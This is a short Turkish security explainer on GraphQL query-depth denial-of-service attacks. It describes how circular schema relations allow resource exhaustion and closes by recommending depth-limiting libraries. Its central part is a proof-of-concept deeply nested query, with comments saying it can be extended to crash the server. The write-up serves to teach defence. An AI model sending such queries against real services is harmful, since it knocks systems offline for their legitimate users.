# Query Depth / Complexity (Sorgu Derinliği) Saldırısı

## Zafiyetin Mantığı Nedir?
GraphQL'in en güçlü yanlarından biri, istemcilerin (client) sadece ihtiyaç duydukları verileri, ilişkisel olarak tek bir sorguyla çekebilmelerine olanak sağlamasıdır. Ancak bu esneklik, aynı zamanda büyük bir güvenlik riski barındırır.

Eğer şema tasarımında objeler arasında çift yönlü veya döngüsel (circular) bir ilişki varsa (Örneğin; `User` modeli `Post` modelini, `Post` modeli de tekrar `User` modelini içeriyorsa) ve sunucu tarafında **sorgu derinliğini sınırlandıran bir kural yoksa**, saldırganlar bu ilişkiyi istismar edebilir.

Saldırgan, bilerek sonu gelmeyen, iç içe geçmiş (nested) ve çok derin bir sorgu hazırlayıp sunucuya gönderir. Sunucu, bu aşırı derin sorguyu çözümlemeye (resolve) çalışırken veri tabanına binlerce istek atar, işlemcisini ve belleğini aşırı derecede tüketir. Bu durum saniyeler içinde sunucunun çökmesine ve diğer kullanıcılara hizmet verememesine (Denial of Service - DoS) neden olur.

## Proof of Concept (PoC) Saldırı Sorgusu

Aşağıdaki sorgu, sistemimizdeki `User -> Posts -> Author -> Posts -> Author` döngüsünü kullanarak oluşturulmuş aşırı derin bir sorgudur. Normalde çok daha fazla iç içe yazılarak sunucuyu anında kilitleyecek hale getirilebilir.

```graphql
query ResourceExhaustionAttack {
  users {
    name
    posts {
      title
      author {
        name
        posts {
          title
          author {
            name
            posts {
              title
              author {
                name
                posts {
                  title
                  author {
                    name
                    posts {
                      title
                      author {
                        name
                        posts {
                          title
                          # Bu döngü saldırgan tarafından kasten yüzlerce/binlerce defa uzatılabilir.
                          # Sunucu bunu işlemeye çalışırken RAM ve CPU tüketiminden dolayı çöker.
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Bu sorgu çalıştırıldığında, sunucu her bir adımda içteki `author` ve `posts` verisini bulmak için tekrar tekrar işlem yapmaya çalışacak ve kaynakları tüketecektir. Bu saldırıyı engellemenin en iyi yolu, `graphql-depth-limit` gibi kütüphaneler kullanarak maksimum sorgu derinliğini (örneğin maksimum 5-6 seviye iç içe) sınırlandırmaktır.
